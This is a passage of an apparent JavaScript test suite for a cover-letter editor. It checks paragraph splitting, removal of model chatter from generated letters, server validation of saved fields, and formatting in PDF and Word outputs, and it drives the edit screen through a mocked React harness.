    // <br> deleted, so it found no copy where the app (and its own signal) saw one — the app showed 3 cards of a letter
    // every download printed 4 paragraphs of, and the next save wrote those 3 back.
    const LINES = 'Led the settlement rebuild at Razorpay<br>Cut reconciliation errors by ninety percent<br>Mentored fourteen engineers across three teams<br>Shipped UPI autopay for the largest merchants';
    const brLetter = `<p>I am writing about the Staff Engineer role on your payments platform, which is the work I have done for six years.</p><p>${LINES}</p>`
      + `<p>Thank you for your time and consideration; I would be glad to walk your team through any of it.</p><p>${LINES.replace(/<br>/g, ', ').replace('fourteen', 'fifteen')}</p>`;
    const brCards = L.splitLetterParagraphs(brLetter);
    ok('⚠️ a near-copy of a card of <br> lines → 3 cards, and the server repairs to exactly those 3',
      brCards.length === 3 && LT.looksContaminatedHtml(brLetter) && LT.repairLetterHtml(brLetter).repaired
        && JSON.stringify(brCards) === JSON.stringify(L.splitLetterParagraphs(LT.repairLetterHtml(brLetter).html)),
      { cards: brCards.length, repaired: LT.repairLetterHtml(brLetter).repaired });
    // ⚠️ ROUND 5 (review, 2026-09-20) — the same four losses and two survivals as the server (server/scripts/
    // test-letter-json.js section 6b), asked of the CARDS, because Customize writes the cards back: a card the backstop
    // drops here is gone from the row with the next save.
    const R5 = [
      'With <strong>fourteen years</strong> of delivery leadership I am applying for the Cyber Security Manager position at Airbus SE, a brief that matches everything I have built since 2011.',
      'In my role as Project Manager at METASYS SOFTWARE PVT. LTD. in Indore, I directed twelve client programmes worth four million dollars and cut schedule slippage by a third over two years.',
      'I am genuinely interested in the strategic cybersecurity initiatives at Airbus SE and am prepared to relocate to Prestwick. Thank you for your consideration of my application.',
    ];
    const HEAD5 = 'Rishi Samadhiya<br>42 Vijay Nagar<br>Indore 452010<br>India<br>rishi@example.com<br>+91 98765 43210';
    const SAME5 = 'I am available to start within four weeks and can relocate to Munich at my own expense.';
    const R5KEEP = {
      'a letterhead card and the same block signed at the bottom': [HEAD5, 'Dear Hiring Manager,', ...R5, 'Sincerely,<br>' + HEAD5],
      'a closing card that repeats a sentence the body already ends with': ['Dear Hiring Manager,', R5[0] + ' ' + SAME5, R5[1], SAME5, 'Sincerely,<br>Rishi Samadhiya'],
      'an applicant opening "Here is the letter of interest you asked me for …"':
        ['Here is the letter of interest you asked me for on Tuesday, together with a note on my notice period.', ...R5, 'Sincerely,<br>Rishi Samadhiya'],
    };
    for (const [name, ps] of Object.entries(R5KEEP)) {
      const letter = ps.map((t) => `<p>${t}</p>`).join('');
      const c = L.splitLetterParagraphs(letter);
      ok(`⚠️ ${name} → all ${ps.length} cards, not flagged — and the server agrees`,
        c.length === ps.length && !L.looksLikeModelJunk(L.splitLetterCards(letter)) && !LT.looksContaminatedHtml(letter) && !LT.repairLetterHtml(letter).repaired,
        { cards: c.length, want: ps.length, flagged: L.looksLikeModelJunk(L.splitLetterCards(letter)), server: LT.looksContaminatedHtml(letter) });
    }
    const R5GO = {
      'the doc-15 wrapper as the last card': [[...R5, 'Rishi, I have completed the cover letter for the Cyber Security Manager position at Airbus.'], /I have completed the cover letter/],
      'the doc-15 wrapper as the first card': [['Rishi, I have completed the cover letter for the Cyber Security Manager position at Airbus.', ...R5], /I have completed the cover letter/],
      // One pass is not a fixed point on either side: a chatter card shielded by a "{" card before it, or by a key card
      // after it, survived the first pass — the app showed it and the server served it.
      'an opener shielded by a "{" card before it': [['{', 'Sure! Here is the cover letter you asked for.', ...R5, '}'], /Sure! Here is/],
      'a sign-off shielded by a key card after it': [[...R5, 'I hope this helps!', '"subject": "Application for Cyber Security Manager"'], /hope this helps/],
    };
    for (const [name, [ps, gone]] of Object.entries(R5GO)) {
      const letter = ps.map((t) => `<p>${t}</p>`).join('');
      const c = L.splitLetterParagraphs(letter);
      ok(`⚠️ ${name} → gone in ONE call, the three real cards left, and the server's repair reads the same`,
        c.length === 3 && !c.some((x) => gone.test(x.html)) && !L.looksLikeModelJunk(c)
          && JSON.stringify(c) === JSON.stringify(L.splitLetterParagraphs(LT.repairLetterHtml(letter).html)),
        { cards: c.length, left: c.some((x) => gone.test(x.html)) });
    }
    // ⚠️ The detector and the repair count the same cards, so a letter can never be flagged for ever and repaired never.
    {
      const long5 = 'With fourteen years in enterprise software delivery I have run programmes of up to forty engineers and delivered custom solutions across many sectors and countries worldwide every year.';
      const many = [long5, ...Array.from({ length: 23 }, (_, i) => `Line ${i}.`), long5.replace('every year', 'each year')];
      const letter = many.map((t) => `<p>${t}</p>`).join('');
      const cards = L.splitLetterCards(letter);
      ok(`⚠️ ${many.length} cards, 2 of them long: flagged ⇒ a card actually goes (never one without the other), like the server`,
        L.looksLikeModelJunk(cards) === (L.withoutModelJunk(cards).length !== cards.length)
          && L.looksLikeModelJunk(cards) === LT.looksContaminatedHtml(letter),
        { flagged: L.looksLikeModelJunk(cards), dropped: cards.length - L.withoutModelJunk(cards).length, server: LT.looksContaminatedHtml(letter) });
    }
  }

  console.log('── 3. ⚠️ THE FULL BOLD TRIP: card → Quill → PUT (server normaliser) → stored → cards → PDF designs + Word ──');
  const docs = require(path.join(ROOT, 'server/services/employerDocs.js'));
  const edr = require(path.join(ROOT, 'server/routes/employerDocsRoutes.js'));
  const layers = edr.stack.filter((l) => l.route).map((l) => ({ m: Object.keys(l.route.methods)[0], p: l.route.path, s: l.route.stack.map((x) => x.handle) }));
  const handler = (m, p) => { const l = layers.find((x) => x.m === m && x.p === p); return l ? l.s[l.s.length - 1] : null; };
  const mkRes = () => { const r = { statusCode: 200, body: null }; r.status = (c) => { r.statusCode = c; return r; }; r.json = (b) => { r.body = b; return r; }; return r; };
  const callRoute = hush(async (m, p, req) => { const res = mkRes(); await handler(m, p)({ user: { id: 7 }, headers: {}, query: {}, params: { id: '9' }, body: {}, ...req }, res); return res; });
  let stored = null;
  const realDocs = { ...docs };
  docs.slimById = async () => ({ id: 9, kind: 'cover_letter' });
  docs.updatePayload = async (uid, id, payload) => { stored = payload; return { ok: true, updatedAt: 'now' }; };
  const CLT = require(path.join(ROOT, 'server/utils/coverLetterTemplates.js'));
  const { buildCoverLetterDocx } = require(path.join(ROOT, 'server/utils/docxBuilder.js'));
  const JSZip = require(require.resolve('jszip', { paths: [path.join(ROOT, 'server')] }));
  const docxText = async (buf) => {
    const xml = await (await JSZip.loadAsync(buf)).file('word/document.xml').async('string');
    const runs = [...xml.matchAll(/<w:r>([\s\S]*?)<\/w:r>/g)].map((m) => ({ bold: /<w:b\/>|<w:b w:val="true"\/>/.test(m[1]), text: [...m[1].matchAll(/<w:t[^>]*>([^<]*)<\/w:t>/g)].map((t) => t[1]).join('') }));
    return { text: runs.map((r) => r.text).join(''), boldText: runs.filter((r) => r.bold).map((r) => r.text).join('|') };
  };
  {
    const blocks = L.splitLetterParagraphs(AI_LETTER);
    // What the letter's Quill box hands back: bold only (LETTER_FORMATS — section 4 proves why no italic).
    const quill2 = '<p>At <strong>Siemens</strong> I led <strong>payments</strong> and platform work.</p>';
    const sent = L.joinLetterParagraphs([blocks[0], ...L.quillToBlocks(quill2), blocks[2]]);
    const r = await callRoute('put', '/:id', { body: { payload: { coverLetterHtml: sent, subject: 'Application', companyName: 'Nordex SE' } } });
    ok('the edited letter is accepted by PUT /employer-docs/:id', r.statusCode === 200 && !!stored, r.body);
    const back = stored ? L.splitLetterParagraphs(stored.coverLetterHtml) : [];
    ok('⚠️ stored, it reads back as the same three cards with 5 / 2 / 4 bold runs', back.map((b) => strongs(b.html)).join(',') === '5,2,4', back);
    ok('…"a < b" is still text after the server re-escaped it', back[0] && /a &lt; b trade-offs/.test(back[0].html), back[0]);
    const data = { sender: { name: 'Ann Example', title: 'Engineer', email: 'ann@example.com', phone: '+49 1', location: 'Berlin, Germany' }, company: { name: 'Nordex SE', address: 'Hamburg' }, bodyHtml: stored && stored.coverLetterHtml };
    const designsKeepBold = CLT.TEMPLATES.every((t) => {
      const h = CLT.renderCoverLetterHtml(t.id, data, {});
      return /<strong>Senior Backend Engineer<\/strong>/.test(h) && /<strong>Siemens<\/strong>/.test(h) && /<strong>ownership<\/strong>/.test(h) && /and platform work\./.test(h);
    });
    ok('⚠️ every PDF design (all 7) prints the same words bold', designsKeepBold);
    const d = await docxText(await buildCoverLetterDocx(data, { template: 'ats_pro' }));
    ok('⚠️ …and so does the Word file (bold runs for the bold words)', /Siemens/.test(d.boldText) && /Senior Backend Engineer/.test(d.boldText) && !/trade-offs/.test(d.boldText), d.boldText);
  }

  console.log('── 3b. ⚠️ WHAT THE USER TYPES IS NEVER FILTERED: Done → PUT → reload keeps it (review, 2026-09-19) ──');
  {
    // The first junk backstop ran on quillToBlocks: each of these came back as NO card, and edit.tsx's onRichDone then
    // spliced the paragraph out and saved the letter without it (an added one was silently ignored).
    const LT = require(path.join(ROOT, 'server/utils/letterText.js'));
    const TYPED = [
      'I hope this cover letter shows why I would be a strong fit. Thank you for your consideration.',
      'Please let me know if you need anything further; I have attached my portfolio as requested.',
      'Please let me know if you would like the letter in another language.',
      'Feel free to contact me; I have attached my résumé alongside this cover letter.',
      'Recently, I have completed the draft of our platform roadmap.',
      'Of course, the output of my team speaks for itself.',
      // ⚠️ ROUND 2 (review, 2026-09-19): the reload cut each of these ("names the format" on its words alone), and the next
      // save of any field wrote the letter back without it.
      'Please let me know if you would like my certificates in the requested format.',
      'Feel free to request my portfolio in the requested format.',
      'Here are my references, available in the requested format.',
      'I hope this letter shows my fit; I can share sample API contracts in JSON format.',
      'I hope this helps explain why I am moving into platform engineering.',
    ];
    const blocks = L.splitLetterParagraphs(AI_LETTER);
    for (const typed of TYPED) {
      const replacement = L.quillToBlocks('<p>' + typed + '</p><p><br></p>');
      ok(`⚠️ Done on paragraph 3 = ${JSON.stringify(typed.slice(0, 40))}… → ONE card with those words (never none)`,
        replacement.length === 1 && L.decodeEntities(replacement[0].html) === typed, replacement);
      stored = null;
      const sent = L.joinLetterParagraphs([blocks[0], blocks[1], ...replacement]);
      const r = await callRoute('put', '/:id', { body: { payload: { coverLetterHtml: sent, subject: 'Application' } } });
      const html = stored ? stored.coverLetterHtml : '';
      const served = LT.repairLetterHtml(html);   // what GET /employer-docs/:id serves on the reload (the same function)
      const back = L.splitLetterParagraphs(served.html);
      ok('…PUT stores it, the reload serves it untouched, and it is still the third card',
        r.statusCode === 200 && served.repaired === false && back.length === 3 && L.decodeEntities(back[2].html) === typed, { status: r.statusCode, repaired: served.repaired, cards: back.length });
    }
    // Even what no letter should hold is the user's to write: the typed box is never second-guessed (the letter as SERVED is
    // what the backstop reads — see edit.tsx).
    ok('quillToBlocks keeps typed JSON, a fence and "Here is the JSON output:" as the user wrote them',
      L.quillToBlocks('<p>{"to": "HR"}</p><p>```json</p><p>Here is the JSON output:</p>').length === 3);
    const EDIT_SRC = fs.readFileSync(path.join(APP, 'app/(cover-letter)/edit.tsx'), 'utf8');
    ok('⚠️ edit.tsx: the junk backstop reads only the letter as served; an edited letter and a retried draft are split raw',
      /bodyHtml === servedHtml \? splitLetterParagraphs\(bodyHtml\) : splitLetterCards\(bodyHtml\)/.test(EDIT_SRC)
        && /setServedHtml\(typeof p\.coverLetterHtml === 'string' \? p\.coverLetterHtml : ''\);/.test(EDIT_SRC)
        && /commitBlocks\(splitLetterCards\(bodyDraft\), opts\)/.test(EDIT_SRC)
        && !/splitLetterParagraphs\(bodyDraft\)/.test(EDIT_SRC));
    const LH_SRC = fs.readFileSync(LETTER_HTML_SRC, 'utf8');
    ok('⚠️ letterHtml.ts: quillToBlocks is the raw splitter (never splitLetterParagraphs)',
      /export function quillToBlocks\(quillHtml: string\): LetterBlock\[\] \{\n\s*return splitCards\(quillHtml\)/.test(LH_SRC));
  }

  console.log('── 4. ⚠️ EVERY PRINTED ELEMENT IS EDITABLE — and every edit reaches every design ──');
  const CL = require(path.join(ROOT, 'server/controllers/coverLetterController.js'));
  const emailC = require(path.join(ROOT, 'server/controllers/emailController.js'));
  {
    // The PUT accepts the new keys and stores them clean; a wrong shape is refused whole.
    stored = null;
    const NUL = String.fromCharCode(0);
    let r = await callRoute('put', '/:id', { body: { payload: {
      coverLetterHtml: '<p>Body</p>', subject: 'Re:' + NUL + ' role', salutation: 'Dear Ms.\nSmith,', closing: 'Kind regards,',
      sender: { name: 'Ann B', phone: '+49 555', title: '' }, companyName: 'Nordex SE', companyAddress: 'Street 1, Hamburg',
    } } });
    ok('PUT stores the letter\'s own greeting, closing and sender (one line each, control characters gone)',
      r.statusCode === 200 && stored && stored.salutation === 'Dear Ms. Smith,' && stored.closing === 'Kind regards,' && stored.subject === 'Re: role'
      && JSON.stringify(stored.sender) === JSON.stringify({ name: 'Ann B', title: '', phone: '+49 555' }), stored);
    const refused = [
      [{ sender: { name: 'A', website: 'x' } }, 'a sender key we do not print'],
      [{ sender: ['Ann'] }, 'a sender array'],
      [{ sender: { email: 42 } }, 'a non-string sender line'],
      [{ sender: { name: 'x'.repeat(201) } }, 'a sender line over 200'],
      [{ salutation: 'x'.repeat(201) }, 'a greeting over 200'],
      [{ closing: { a: 1 } }, 'a non-string closing'],
      [{ subject: 'x'.repeat(301) }, 'a subject over 300'],
      [{ companyAddress: 'x'.repeat(601) }, 'an address over 600'],
    ];
    const leaks = [];
    for (const [extra, why] of refused) {
      stored = null;
      const rr = await callRoute('put', '/:id', { body: { payload: { coverLetterHtml: '<p>Body</p>', ...extra } } });
      if (rr.statusCode !== 400 || stored) leaks.push(why);
    }
    ok('⚠️ a wrong-shaped or over-long printed line is refused (400), nothing stored', leaks.length === 0, leaks);
    stored = null;
    r = await callRoute('put', '/:id', { body: { payload: { coverLetterHtml: '<p>Body</p>', salutation: '   ', sender: { name: null } } } });
    ok('an emptied greeting and an empty sender are removed — the design\'s own lines print', r.statusCode === 200 && stored && !('salutation' in stored) && !('sender' in stored), stored);

    // GET /:id/sender — the profile block the page shows and compares against (read-only, a letter only).
    const realBuild = CL.buildCLSender;
    let asked = 0;
    CL.buildCLSender = async () => { asked++; return { name: 'Ann Example', email: 'ann@example.com', phone: '+49 1', location: 'Berlin, Germany', title: 'Engineer' }; };
    r = await callRoute('get', '/:id/sender', {});
    ok('GET /employer-docs/:id/sender answers the profile\'s five printed lines', r.statusCode === 200 && r.body.sender.location === 'Berlin, Germany' && r.body.sender.title === 'Engineer' && Object.keys(r.body.sender).join() === 'name,title,email,phone,location', r.body);
    docs.slimById = async () => ({ id: 9, kind: 'resume' });
    r = await callRoute('get', '/:id/sender', {});
    ok('…a résumé id is refused (bad_kind)', r.statusCode === 400 && r.body.reason === 'bad_kind');
    docs.slimById = async () => null;
    r = await callRoute('get', '/:id/sender', {});
    ok('…another user\'s (or a deleted) id is gone', r.statusCode === 404 && r.body.reason === 'gone');
    docs.slimById = async () => ({ id: 9, kind: 'cover_letter' });
    CL.buildCLSender = realBuild;
    ok('the sender route sits behind authenticateToken', (() => { const l = layers.find((x) => x.m === 'get' && x.p === '/:id/sender'); return !!l && l.s.length === 2 && l.s[0] === require(path.join(ROOT, 'server/middleware/auth.js')).authenticateToken; })());

    // The merge: the page's effectiveSender and the server's mergeLetterSender must print the same sender.
    const profile = { name: 'Ann Example', email: 'ann@example.com', phone: '+49 1', location: 'Berlin, Germany', title: 'Engineer' };
    const cases = [
      undefined, null, {}, { phone: '+49 555' }, { name: '' }, { name: '  ' }, { email: '' }, { title: 'Lead', location: 'Hamburg' },
      { name: 'Ann B', title: '', email: 'a@b.c', phone: '', location: '' }, { website: 'x' }, { phone: 5 },
    ];
    const mismatch = cases.filter((o) => {
      const a = L.effectiveSender(profile, o);
      const b = CL.mergeLetterSender(profile, o);
      return L.SENDER_KEYS.some((k) => a[k] !== b[k]);
    });
    ok('⚠️ the page shows the sender the server prints (effectiveSender ≡ mergeLetterSender, 11 cases)', mismatch.length === 0, mismatch);
    ok('an override wins, \'\' prints nothing, a blank name falls back to the profile',
      CL.mergeLetterSender(profile, { phone: '+49 555', email: '', name: ' ' }).phone === '+49 555'
      && CL.mergeLetterSender(profile, { email: '' }).email === '' && CL.mergeLetterSender(profile, { name: '' }).name === 'Ann Example');
    ok('⚠️ a letter with no override hashes as before (same keys, same ORDER — no Home card is re-rendered for nothing)',
      JSON.stringify(CL.mergeLetterSender(profile, undefined)) === JSON.stringify(profile));

    // What each design prints, from a payload that sets every line.
    const payload = {
      coverLetterHtml: '<p>I led <strong>payments</strong>.</p>', companyName: 'Acme Robotics', companyAddress: '1 Custom Way, Springfield',
      salutation: 'Dear Ms. Custom-Greeting,', closing: 'Custom-Closing regards,',
      sender: { name: 'Zed Custom-Name', title: 'Custom-Title Architect', email: 'custom@mail.example', phone: '+1 555 0100', location: 'Custom City, Nowhere' },
    };
    const sender = CL.mergeLetterSender(profile, payload.sender);
    const data = { sender, company: { name: payload.companyName, address: payload.companyAddress }, bodyHtml: payload.coverLetterHtml, ...CL.letterLinesOf(payload) };
    const want = ['Zed Custom-Name', 'Custom-Title Architect', 'custom@mail.example', '+1 555 0100', 'Custom City, Nowhere', 'Acme Robotics', '1 Custom Way, Springfield', 'Dear Ms. Custom-Greeting,', 'Custom-Closing regards,'];
    const missing = [];
    for (const t of CLT.TEMPLATES) {
      const h = CLT.renderCoverLetterHtml(t.id, data, { photo: 'data:image/jpeg;base64,UEhPVE8=' });
      // The Original (Branded) design has never printed a phone number — every other line it prints.
      for (const w of want) if (!(t.generic && w === '+1 555 0100') && !h.includes(w)) missing.push(t.id + ': ' + w);
      if (/Dear Hiring Manager,|Dear Sir or Madam,/.test(h)) missing.push(t.id + ': still prints the default greeting');
    }
    ok('⚠️ all 7 PDF designs print the letter\'s own name, title, email, phone, location, company, address, greeting and closing', missing.length === 0, missing);
    ok('…and the Original (Branded) design carries the profile photo', CLT.renderCoverLetterHtml('standard', data, { photo: 'data:image/jpeg;base64,UEhPVE8=' }).includes('data:image/jpeg;base64,UEhPVE8='));
    const plain = { sender: profile, company: { name: 'Acme' }, bodyHtml: '<p>x</p>' };
    ok('without the new keys every design is byte-identical to before (the design\'s own greeting / closing)',
      CLT.TEMPLATES.every((t) => CLT.renderCoverLetterHtml(t.id, plain, {}) === CLT.renderCoverLetterHtml(t.id, { ...plain, salutation: '', closing: '   ' }, {}))
      && /Dear Sir or Madam,/.test(CLT.renderCoverLetterHtml('german', plain, {})) && /Respectfully,/.test(CLT.renderCoverLetterHtml('exec_leader', plain, {})));

    const wordMissing = [];
    for (const t of CLT.TEMPLATES) {
      const d = await docxText(await buildCoverLetterDocx(data, { template: t.id }));
      for (const w of ['Zed Custom-Name', 'Acme Robotics', 'Dear Ms. Custom-Greeting,', 'Custom-Closing regards,']) if (!d.text.includes(w)) wordMissing.push(t.id + ': ' + w);
      if (/Dear Hiring Manager,|Dear Sir or Madam,|Best regards,|Sincerely,|Respectfully,|Yours faithfully,|Yours sincerely,/.test(d.text)) wordMissing.push(t.id + ': a default line is still printed');
    }
    ok('⚠️ all 7 Word layouts print the letter\'s own name, company, greeting and closing (no default line left)', wordMissing.length === 0, wordMissing);
    const wordPlain = await docxText(await buildCoverLetterDocx(plain, { template: 'german' }));
    ok('…and without them the Word layout keeps its own lines', /Dear Sir or Madam,/.test(wordPlain.text) && /Yours faithfully,/.test(wordPlain.text));

    // The Original (Branded) DOWNLOAD is drawn by the PDFKit generator from the users row: every text() call recorded.
    const PDFKit = require(require.resolve('pdfkit', { paths: [path.join(ROOT, 'server')] }));
    const drawn = [];
    const drawnBold = [];   // what was drawn while a BOLD face was set — the generator's <strong> runs, word by word
    const faces = [];       // every text() call with the face it was drawn in: [str, face]
    let face = '';
    const realText = PDFKit.prototype.text;
    const realFont = PDFKit.prototype.font;
    PDFKit.prototype.font = function (name, ...rest) { face = String(name); return realFont.call(this, name, ...rest); };
    PDFKit.prototype.text = function (str, ...rest) { drawn.push(String(str)); faces.push([String(str), face]); if (/bold/i.test(face)) drawnBold.push(String(str)); return realText.call(this, str, ...rest); };
    const made = [];
    const drawPdf = hush(async (user, opts) => { drawn.length = 0; drawnBold.length = 0; const r = await emailC.generateCoverLetterPDF(user, payload.coverLetterHtml, 'Acme Robotics', '1 Custom Way, Springfield', null, null, opts); made.push(r.filePath); return drawn.slice(); });
    const user = { id: 7, full_name: 'Ann Example', email: 'ann@example.com', phone_number: '+49 1', city: 'Berlin', country: 'Germany' };
    const rich = CL.richLetterArgsOf(user, payload);
    const pdfText = (await drawPdf(rich.user, rich.opts)).join(' ');
    const pdfMissing = want.filter((w) => !pdfText.includes(w) && !pdfText.includes(w.toUpperCase()));
    ok('⚠️ the Original (Branded) PDFKit download prints every line too — name, title, email, phone, location, company, address, greeting, closing',
      pdfMissing.length === 0 && !/Dear Hiring Manager,|Best regards,/.test(pdfText) && !/Berlin|Germany/.test(pdfText), { pdfMissing, pdfText: pdfText.slice(0, 300) });
    ok('⚠️ …and it draws the letter\'s bold word in the BOLD face — the same <strong> the card showed and the box edited',
      drawnBold.includes('payments') && !drawnBold.includes('led'), drawnBold);
    const untouched = CL.richLetterArgsOf(user, { coverLetterHtml: '<p>x</p>' });
    ok('an untouched letter hands the generator the row as it is and no options', JSON.stringify(untouched.user) === JSON.stringify(user) && JSON.stringify(untouched.opts) === '{}');
    const classic = (await drawPdf(user, undefined)).join(' ');
    ok('…and the classic call prints exactly its old lines (Dear Hiring Manager, / Best regards, / Berlin / Germany)',
      /Dear Hiring Manager,/.test(classic) && /Best regards,/.test(classic) && /Berlin/.test(classic) && /Germany/.test(classic));

    // ⚠️ EVERY FORMAT THE PARAGRAPH EDITOR OFFERS PRINTS IN EVERY DESIGN. A run the box can make shows in its card, so it
    // must come out of the 7 HTML/PDF designs, the 7 Word layouts AND the Original's PDFKit download — which draws with a
    // regular and a bold face only (createCoverLetterPDFFromHTML), so an 'italic' offered in the box would print UPRIGHT
    // there while the card and the other designs showed it slanted (the round-1 review). The list is the page's own
    // LETTER_FORMATS; offering a format this cannot find printed everywhere fails here.
    const FORMAT = {
      bold:      { tag: 'strong', face: /bold/i,           word: /<w:b\/>|<w:b w:val="true"\/>/ },
      italic:    { tag: 'em',     face: /italic|oblique/i, word: /<w:i\/>|<w:i w:val="true"\/>/ },
      underline: { tag: 'u',      face: null,              word: /<w:u\b/ },
      header:    { tag: 'h2',     face: null,              word: null },
    };
    const unprinted = [];
    for (const f of EDITOR_FORMATS) {
      const spec = FORMAT[f];
      if (!spec) { unprinted.push(f + ': a format this suite does not know'); continue; }
      const html = `<p>I led <${spec.tag}>payments</${spec.tag}> at scale.</p>`;
      const runData = { ...data, bodyHtml: html };
      for (const t of CLT.TEMPLATES) {
        if (!CLT.renderCoverLetterHtml(t.id, runData, {}).includes(`<${spec.tag}>payments</${spec.tag}>`)) unprinted.push(`${f}: ${t.id} HTML/PDF`);
        const xml = await (await JSZip.loadAsync(await buildCoverLetterDocx(runData, { template: t.id }))).file('word/document.xml').async('string');
        const run = [...xml.matchAll(/<w:r>([\s\S]*?)<\/w:r>/g)].map((x) => x[1]).find((x) => /<w:t[^>]*>payments<\/w:t>/.test(x));
        if (!run || !spec.word || !spec.word.test(run)) unprinted.push(`${f}: ${t.id} Word`);
      }
      faces.length = 0;
      const r = await hush(() => emailC.generateCoverLetterPDF(user, html, 'Acme Robotics', '', null, null))();
      made.push(r.filePath);
      const drawnAs = faces.filter(([str]) => str === 'payments').map(([, fc]) => fc);
      if (!drawnAs.length || !spec.face || !drawnAs.every((fc) => spec.face.test(fc))) unprinted.push(`${f}: the Original PDFKit download drew it in ${JSON.stringify(drawnAs)}`);
    }
    ok(`⚠️ every format the paragraph editor offers (${EDITOR_FORMATS.join(', ')}) PRINTS in all 7 designs, all 7 Word layouts and the Original's PDFKit download`,
      EDITOR_FORMATS.includes('bold') && unprinted.length === 0, { EDITOR_FORMATS, unprinted });
    PDFKit.prototype.text = realText;
    PDFKit.prototype.font = realFont;
    for (const f of made) { try { fs.unlinkSync(f); } catch { /* already gone */ } }
    Object.assign(docs, realDocs);
  }

  console.log('── 5. THE PAGE, driven like a thumb ──');
  const RICH = transpile(RICH_SRC, 'RichText.tsx');
  const SCREEN = transpile(EDIT_SRC, 'edit.tsx');
  const LH = path.join(OUT, 'letterHtml.js');

  /* fake React: hooks by call order; function components are EXPANDED (none below the screen has hooks) so every
     button the user can reach is in the tree. RichTextModal (the one with hooks) is replaced by a plain element. */
  let current = null;
  const depsEq = (a, b) => !!a && !!b && a.length === b.length && a.every((x, i) => Object.is(x, b[i]));
  const FakeReact = {
    createElement(type, props, ...children) {
      const kids = [];
      const push = (c) => { if (c == null || c === false || c === true) return; Array.isArray(c) ? c.forEach(push) : kids.push(c); };
      children.forEach(push);
      if (props && props.children !== undefined && !children.length) push(props.children);
      if (typeof type === 'function') return type({ ...(props || {}), children: kids.length === 1 ? kids[0] : kids });
      return { $el: true, type, props: props || {}, children: kids };
    },
    Fragment: 'Fragment',
    useState(init) {
      const inst = current; const i = inst.idx++;
      if (!inst.hooks[i]) {
        const slot = { v: typeof init === 'function' ? init() : init };
        slot.set = (nv) => { const next = typeof nv === 'function' ? nv(slot.v) : nv; if (!Object.is(next, slot.v)) { slot.v = next; inst.schedule(); } };
        inst.hooks[i] = slot;
      }
      return [inst.hooks[i].v, inst.hooks[i].set];
    },
    useRef(init) { const inst = current; const i = inst.idx++; if (!inst.hooks[i]) inst.hooks[i] = { ref: { current: init } }; return inst.hooks[i].ref; },
    useMemo(fn, deps) { const inst = current; const i = inst.idx++; const s = inst.hooks[i]; if (!s || !depsEq(s.deps, deps)) inst.hooks[i] = { v: fn(), deps }; return inst.hooks[i].v; },
    useCallback(fn, deps) { return FakeReact.useMemo(() => fn, deps); },
    useEffect(fn, deps) {
      const inst = current; const i = inst.idx++; const s = inst.hooks[i];
      if (!s) { inst.hooks[i] = { fn, deps, cleanup: null, effect: true }; inst.pending.push(i); }
      else if (!deps || !depsEq(s.deps, deps)) { s.fn = fn; s.deps = deps; inst.pending.push(i); }
    },
  };
  function mount(fn) {
    const inst = { hooks: [], idx: 0, pending: [], unmounted: false, result: null };
    let scheduled = false;
    inst.schedule = () => { if (scheduled || inst.unmounted) return; scheduled = true; queueMicrotask(() => { scheduled = false; if (!inst.unmounted) renderNow(); }); };
    function renderNow() {
      current = inst; inst.idx = 0; inst.pending = [];
      inst.result = fn();
      current = null;
      const pend = inst.pending; inst.pending = [];
      for (const i of pend) { const slot = inst.hooks[i]; if (slot.cleanup) slot.cleanup(); const c = slot.fn(); slot.cleanup = typeof c === 'function' ? c : null; }
    }
    renderNow();
    return { get tree() { return inst.result; }, unmount() { inst.unmounted = true; } };
  }
  const walk = (node, fn) => { if (!node || !node.$el) return; fn(node); for (const c of node.children) walk(c, fn); };
  const findAll = (root, pred) => { const out = []; walk(root, (n) => { if (pred(n)) out.push(n); }); return out; };
  const textOf = (node) => { const out = []; const rec = (n) => { if (n == null) return; if (typeof n === 'string' || typeof n === 'number') { out.push(String(n)); return; } if (n.$el) n.children.forEach(rec); }; rec(node); return out.join(''); };
  const flat = (st) => (Array.isArray(st) ? Object.assign({}, ...st.map(flat)) : (st && typeof st === 'object' ? st : {}));

  /* mocks */
  let doc, saves, saveAnswers, alerts, fetches, pushes, backs, stash, prevent, params;
  const jsonRes = (status, body) => ({ ok: status >= 200 && status < 300, status, json: async () => body });
  global.fetch = async (url) => {
    const u = String(url);
    fetches.push(u);
    if (u.endsWith('/users/profile')) return jsonRes(200, { fullName: 'Ann Example', email: 'ann@example.com', phone: '+49 1', profileImage: 'https://api.test/uploads/photo.jpg', signature: 'https://api.test/uploads/sig.png' });
    if (/\/employer-docs\/9\/sender$/.test(u)) return jsonRes(200, { success: true, sender: { name: 'Ann Example', title: 'Engineer', email: 'ann@example.com', phone: '+49 1', location: 'Berlin, Germany' } });
    return jsonRes(404, {});
  };
  const RN = {
    View: 'View', Text: 'Text', TouchableOpacity: 'TouchableOpacity', ScrollView: 'ScrollView', ActivityIndicator: 'ActivityIndicator',
    TextInput: 'TextInput', Image: 'Image', KeyboardAvoidingView: 'KeyboardAvoidingView', Modal: 'Modal', StatusBar: 'StatusBar',
    StyleSheet: { create: (o) => o },
    Alert: { alert: (title, msg, buttons) => alerts.push({ title, msg, buttons: buttons || [] }) },
    Platform: { OS: 'ios', select: (o) => ('ios' in o ? o.ios : o.default) },
    Keyboard: { dismiss() {}, addListener: () => ({ remove() {} }) },
  };
  const origLoad = Module._load;
  let richMod = null;
  Module._load = function (request) {
    if (request === 'react') return FakeReact;
    if (request === 'react-native') return RN;
    if (request === 'react-native-safe-area-context') return { SafeAreaView: 'SafeAreaView', useSafeAreaInsets: () => ({ top: 0, bottom: 0 }) };
    if (request === 'react-native-webview') return { WebView: 'WebView' };
    if (request === 'expo-linear-gradient') return { LinearGradient: 'LinearGradient' };
    if (request === '@expo/vector-icons') return { Ionicons: 'Ionicons' };
    if (request === 'expo-router') return {
      useRouter: () => ({ push: (x) => pushes.push(x), back: () => { backs++; }, replace: () => {}, canGoBack: () => true }),
      useLocalSearchParams: () => params,
      useNavigation: () => ({ dispatch() {} }),
    };
    if (request === '@react-navigation/native') return { usePreventRemove: (cond, cb) => { prevent = { cond, cb }; } };
    if (request === '@react-native-async-storage/async-storage') return { __esModule: true, default: { setItem: async (k, v) => { stash[k] = v; }, getItem: async (k) => stash[k] || null } };
    if (request === 'expo-secure-store') return { getItemAsync: async () => JSON.stringify({ token: 'tok' }) };
    if (request === '../../config') return { API_BASE: 'https://api.test' };
    if (request === '../../services/employerDocs') return {
      fetchDoc: async (id) => (id === 9 ? doc : null),
      saveDocPayload: async (id, payload) => { saves.push({ id, payload: JSON.parse(JSON.stringify(payload)) }); return saveAnswers.length ? saveAnswers.shift() : { ok: true, updatedAt: 'now' }; },
    };
    if (request === '../../services/letterHtml') return origLoad.call(this, LH, ...Array.prototype.slice.call(arguments, 1));
    if (request === '../../components/rich-text/RichText') {
